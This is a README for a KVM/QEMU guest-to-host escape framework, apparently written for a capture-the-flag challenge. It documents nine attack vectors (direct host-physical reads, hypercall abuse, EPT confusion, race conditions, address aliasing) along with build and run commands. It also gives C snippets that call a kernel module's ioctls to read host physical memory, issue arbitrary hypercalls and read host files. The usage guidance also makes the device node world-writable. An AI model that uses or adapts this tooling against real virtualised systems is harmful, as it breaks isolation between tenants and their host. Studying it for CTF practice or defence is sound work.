# KVM Escape Exploitation Framework

Advanced multi-vector guest-to-host escape toolkit for KVM/QEMU environments.

## Overview

This framework implements 8+ sophisticated attack vectors for escaping from a KVM guest virtual machine to access host physical memory. The primary goal is to read/write specific host memory addresses containing flags.

### Target Configuration

```
Guest RAM Layout:
  - 0x00001000 - 0x0009fbff  (Low RAM)
  - 0x00100000 - 0x7fff9fff   (Main RAM ~2GB)
  - 0x100000000 - 0x17fffffff (High RAM ~2GB)
  
Host Target Addresses (Physical):
  - Write Flag: 0x64279a8
  - Read Flag:  0x695ee10
```

## Quick Start

### 1. Compilation

```bash
# Make build script executable
chmod +x build.sh

# Build everything (kernel module + userspace tools)
./build.sh
```

This will:
- Compile the kernel module (`kvm_probe_drv.ko`)
- Compile `kvm_escape_advanced` (multi-vector tool)
- Compile `address_space_attack` (massive mapping tool)
- Load the kernel module
- Create `/dev/kvm_probe_dev` device node

### 2. Basic Exploitation

```bash
# Run all attack vectors (recommended first try)
./kvm_escape_advanced

# Run specific vector (1-8)
./kvm_escape_advanced 1  # Direct HPA access
./kvm_escape_advanced 3  # Hypercall exploitation
./kvm_escape_advanced 5  # EPT confusion

# Address space aliasing attack
./address_space_attack          # Full attack
./address_space_attack fast     # Quick mode
./address_space_attack scan     # With MMIO scan
```

### 3. Monitor Output

In another terminal:
```bash
# Watch kernel logs in real-time
sudo dmesg -w | grep kvm_probe
```

## File Structure

```
.
├── build.sh                          # Automated build script
├── kvm_probe_drv_enhanced.c          # Enhanced kernel driver
├── kvm_escape_advanced.c             # Multi-vector userspace tool
├── address_space_attack.c            # Address aliasing attack
├── EXPLOITATION_GUIDE.md             # Detailed technique descriptions
└── README.md                         # This file
```

## Attack Vectors

### Vector 1: Direct HPA Access
**Strategy:** Attempt `ioremap()` on target host physical addresses  
**Likelihood:** Low (but quick to try)  
**Command:** `./kvm_escape_advanced 1`

### Vector 2: MMIO Region Scanning
**Strategy:** Scan physical address space for accessible MMIO regions  
**Likelihood:** Medium  
**Command:** `./kvm_escape_advanced 2`

### Vector 3: Hypercall Memory Operations
**Strategy:** Use hypercalls to request host memory operations  
**Likelihood:** High (if custom hypercalls exist)  
**Command:** `./kvm_escape_advanced 3`

### Vector 4: GPA Space Expansion
**Strategy:** Allocate memory at specific addresses, check for aliasing  
**Likelihood:** Medium  
**Command:** `./kvm_escape_advanced 4`

### Vector 5: EPT Confusion
**Strategy:** Access GPAs outside documented ranges  
**Likelihood:** Medium-High  
**Command:** `./kvm_escape_advanced 5`

### Vector 6: Port I/O Exploitation
**Strategy:** Use I/O ports to trigger memory operations  
**Likelihood:** Low-Medium  
**Command:** `./kvm_escape_advanced 6`

### Vector 7: Race Conditions
**Strategy:** Multi-threaded hypercall races  
**Likelihood:** Medium  
**Command:** `./kvm_escape_advanced 7`  
**Warning:** Resource-intensive, runs for 5 seconds

### Vector 8: Systematic Memory Scan
**Strategy:** Brute-force scan entire address space  
**Likelihood:** Low (but comprehensive)  
**Command:** `./kvm_escape_advanced 8`  
**Warning:** Very slow, can take hours

### Vector 9: Address Space Aliasing
**Strategy:** Map massive amounts of guest memory, look for GPA→HPA aliasing  
**Likelihood:** Medium  
**Command:** `./address_space_attack`

## Kernel Module Features

The enhanced kernel module provides:

### IOCTLs for Memory Access
- `IOCTL_READ_GPA` / `IOCTL_WRITE_GPA` - Guest physical memory
- `IOCTL_READ_HPA` / `IOCTL_WRITE_HPA` - Host physical memory (via ioremap)
- `IOCTL_READ_MMIO` / `IOCTL_WRITE_MMIO` - MMIO regions
- `IOCTL_READ_PORT` / `IOCTL_WRITE_PORT` - I/O ports

### Hypercall Support
- `IOCTL_HYPERCALL_ARGS` - Execute arbitrary hypercalls
- `IOCTL_BATCH_HYPERCALL` - Batch hypercall execution
- Returns rax (return value) and supports 0-4 arguments

### Shared Memory
- `IOCTL_ALLOC_SHARED_BUF` - 64KB shared buffer
- `IOCTL_ALLOC_LARGE_POOL` - 16MB large pool
- Persistent across hypercalls for receiving data

### Utilities
- `IOCTL_VIRT_TO_PHYS` - Virtual to physical translation
- `IOCTL_PHYS_TO_VIRT` - Physical to virtual translation
- `IOCTL_GET_KASLR_SLIDE` - Host KASLR detection
- `IOCTL_READ_FILE` - Read host files

## Understanding the Exploitation

### Memory Model

```
Guest Virtual Address (GVA)
         ↓ [Guest Page Tables]
Guest Physical Address (GPA) ← We control these
         ↓ [EPT - Extended Page Tables]
Host Physical Address (HPA) ← Target: 0x64279a8, 0x695ee10
```

**The Goal:** Find a way to make a GPA we control translate to the target HPA.

### Vulnerability Classes

1. **Address Confusion:** Host interprets GPA as HPA
2. **EPT Misconfiguration:** Wrong GPA→HPA mappings
3. **Integer Overflows:** In address calculations
4. **TOCTOU Races:** In multi-core scenarios
5. **Validation Failures:** Missing bounds checks
6. **Device Mapping Errors:** PCI BARs pointing to host RAM

## Success Indicators

### In Userspace Output
```
[+] Read X bytes from HOST physical 0x64279a8
Address          | Hex Bytes                    | ASCII
-----------------|------------------------------|------
0x0000000064279a8 | 66 6C 61 67 7B ...          | flag{...
```

### In Kernel Log (dmesg)
```
[+] HYPERCALL completed with data transfer
[+] Suspicious memory access pattern detected
[+] Found flag pattern in shared buffer
```

## Troubleshooting

### Module Won't Load
```bash
# Check kernel version
uname -r

# Verify kernel headers
ls /lib/modules/$(uname -r)/build

# Check for errors
dmesg | tail -20
```

### Device Not Accessible
```bash
# Check device exists
ls -la /dev/kvm_probe_dev

# Should show: crw-rw-rw-

# Fix permissions
sudo chmod 666 /dev/kvm_probe_dev
```

### Compilation Errors
```bash
# Install required packages
sudo apt-get update
sudo apt-get install build-essential linux-headers-$(uname -r)

# Clean and rebuild
make clean
./build.sh
```

### No Output from Tools
```bash
# Verify module is loaded
lsmod | grep kvm_probe

# Check dmesg for errors
sudo dmesg | grep -i error

# Try with sudo
sudo ./kvm_escape_advanced
```

## Advanced Usage

### Custom Hypercall Testing

```c
// In your code:
struct hypercall_args args = {
    .nr = 101,              // Hypercall number
    .arg0 = 0x64279a8,     // Source HPA
    .arg1 = shared_gpa,    // Dest GPA
    .arg2 = 256,           // Size
    .arg3 = 0
};

ioctl(fd, IOCTL_HYPERCALL_ARGS, &args);
printf("Return: 0x%lx\n", args.ret_value);
```

### Reading Specific Memory

```c
// Read guest physical address
struct gpa_io_data data = {
    .gpa = 0x1000000,
    .size = 4096,
    .user_buffer = malloc(4096)
};
ioctl(fd, IOCTL_READ_GPA, &data);

// Read via ioremap (for MMIO/potential HPA)
struct hpa_io_data hpa_data = {
    .hpa = 0x64279a8,
    .size = 256,
    .user_buffer = malloc(256)
};
ioctl(fd, IOCTL_READ_HPA, &hpa_data);
```

### Batch Operations

```c
struct batch_hypercall batch;
batch.num_calls = 3;

// First call
batch.calls[0].nr = 100;
batch.calls[0].arg0 = addr1;
// ... set other args

// Second call
batch.calls[1].nr = 101;
// ... etc

ioctl(fd, IOCTL_BATCH_HYPERCALL, &batch);

// Check return values
for (int i = 0; i < batch.num_calls; i++) {
    printf("Call %d returned: %ld\n", i, batch.calls[i].ret_value);
}
```

## Performance Notes

### Memory Consumption
- `address_space_attack` can allocate several GB of RAM
- Large pool: 16MB by default
- Each mapped region: varies (1MB - 1GB)

### Execution Times
- Vector 1-6: < 1 second each
- Vector 7: ~5 seconds (multi-threaded)
- Vector 8: Minutes to hours (full scan)
- Address space attack: 1-5 minutes

## Safety Considerations

### This Framework Will:
- Load a custom kernel module
- Perform extensive memory operations
- Issue many hypercalls
- Potentially crash the guest VM

### Recommendations:
1. Use in isolated test environment
2. Take VM snapshots before running
3. Monitor host system resources
4. Have console access to VM
5. Be prepared for guest kernel panics

### Warning Signs:
- Guest becomes unresponsive
- Excessive CPU usage on host
- Host kernel warnings
- I/O errors

If any of these occur, immediately:
```bash
# In guest (if possible)
sudo rmmod kvm_probe_drv

# On host
virsh destroy <vm_name>
# or
kill <qemu_pid>
```

## Debugging

### Enable Verbose Logging

```bash
# In guest kernel module
echo 8 > /proc/sys/kernel/printk  # More verbose

# Watch all messages
sudo dmesg -w

# Filter for our messages
sudo dmesg | grep -E "kvm_probe|HYPERCALL|GPA|HPA"
```

### GDB Debugging

```bash
# Debug userspace tool
gdb ./kvm_escape_advanced
(gdb) run 3
(gdb) bt  # backtrace on crash
```

### Kernel Module Debug

```bash
# Load with debugging
sudo insmod kvm_probe_drv.ko dyndbg=+pflmt

# Or set debug level
sudo insmod kvm_probe_drv.ko debug=1
```

## Understanding Results

### Successful Exploitation
If you see readable data at the target address, especially containing "flag{" or similar patterns, you've successfully escaped!

### Partial Success
- Accessing nearby addresses
- Reading host memory (but wrong location)
- Triggering hypercall responses with data

### No Success Indicators
- All operations return errors
- No data in buffers
- Hypercalls return negative values
- MMIO regions all empty

## Next Steps After Success

1. **Document the vulnerability:**
   - Which vector worked
   - Exact command/parameters
   - Kernel/QEMU versions

2. **Extract the flags:**
   - Read flag addresses completely
   - Write flag confirmation

3. **Analyze the root cause:**
   - Why did this work?
   - EPT misconfiguration?
   - Hypercall bug?
   - Device mapping error?

## References

- [EXPLOITATION_GUIDE.md](./EXPLOITATION_GUIDE.md) - Detailed technical guide
- [KVM Documentation](https://www.kernel.org/doc/Documentation/virt/kvm/)
- [Intel SDM Vol 3](https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html) - EPT details
- [QEMU Documentation](https://www.qemu.org/docs/master/)

## Credits

Framework developed for KVM CTF challenge exploitation.  
Educational and authorized security research purposes only.

## License

Research/Educational use. Not for unauthorized system access.
